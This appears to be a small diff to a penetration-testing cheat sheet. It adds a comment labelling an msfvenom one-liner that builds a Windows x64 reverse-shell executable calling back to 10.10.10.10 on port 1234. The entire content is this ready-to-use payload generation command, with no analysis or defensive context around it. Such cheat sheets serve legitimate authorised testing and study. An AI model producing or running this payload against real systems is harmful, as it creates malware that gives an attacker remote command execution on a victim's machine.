@@ -1,1 +1,3 @@
+# EXE, no meterpreter reverse shell.
+
 msfvenom LHOST=10.10.10.10 LPORT=1234 -p windows/x64/shell_reverse_tcp -f exe > file.exe
